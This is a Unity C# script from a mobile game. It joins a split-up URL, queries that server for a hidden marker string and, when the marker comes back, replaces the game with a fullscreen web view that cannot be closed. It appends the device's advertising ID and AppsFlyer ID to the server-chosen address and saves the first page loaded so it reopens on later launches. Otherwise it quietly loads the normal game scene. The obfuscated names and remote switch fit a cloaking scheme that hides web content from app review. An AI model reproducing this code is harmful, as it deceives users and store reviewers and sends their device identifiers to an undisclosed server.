using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainSOA : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string odinSOANameName = "";
    [HideInInspector] public string dvaSOANameName = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaSOA") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { odinSOANameName = advertisingId; });
        }
    }
    

    private void StartSOA()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("Bootstrap");
    }

    

    private void BRIDGESOABEHOLD(string UrlSOAcitation, string NamingSOA = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _exilesSOA = gameObject.AddComponent<UniWebView>();
        _exilesSOA.SetToolbarDoneButtonText("");
        switch (NamingSOA)
        {
            case "0":
                _exilesSOA.SetShowToolbar(true, false, false, true);
                break;
            default:
                _exilesSOA.SetShowToolbar(false);
                break;
        }
        _exilesSOA.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _exilesSOA.OnShouldClose += (view) =>
        {
            return false;
        };
        _exilesSOA.SetSupportMultipleWindows(true);
        _exilesSOA.SetAllowBackForwardNavigationGestures(true);
        _exilesSOA.OnMultipleWindowOpened += (view, windowId) =>
        {
            _exilesSOA.SetShowToolbar(true);

        };
        _exilesSOA.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingSOA)
            {
                case "0":
                    _exilesSOA.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _exilesSOA.SetShowToolbar(false);
                    break;
            }
        };
        _exilesSOA.OnOrientationChanged += (view, orientation) =>
        {
            _exilesSOA.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _exilesSOA.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlSOAcitation", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlSOAcitation", url);
            }
        };
        _exilesSOA.Load(UrlSOAcitation);
        _exilesSOA.Show();
    }

    private IEnumerator IENUMENATORSOA()
    {
        using (UnityWebRequest soa = UnityWebRequest.Get(dvaSOANameName))
        {

            yield return soa.SendWebRequest();
            if (soa.isNetworkError)
            {
                StartSOA();
            }
            int graphSOA = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && graphSOA > 0)
            {
                yield return new WaitForSeconds(1);
                graphSOA--;
            }
            try
            {
                if (soa.result == UnityWebRequest.Result.Success)
                {
                    if (soa.downloadHandler.text.Contains("ScrtsfAztcPdsedqhj"))
                    {

                        try
                        {
                            var subs = soa.downloadHandler.text.Split('|');
                            BRIDGESOABEHOLD(subs[0] + "?idfa=" + odinSOANameName, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            BRIDGESOABEHOLD(soa.downloadHandler.text + "?idfa=" + odinSOANameName + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        StartSOA();
                    }
                }
                else
                {
                    StartSOA();
                }
            }
            catch
            {
                StartSOA();
            }
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlSOAcitation", string.Empty) != string.Empty)
            {
                BRIDGESOABEHOLD(PlayerPrefs.GetString("UrlSOAcitation"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    dvaSOANameName += n;
                }
                StartCoroutine(IENUMENATORSOA());
            }
        }
        else
        {
            StartSOA();
        }
    }
}
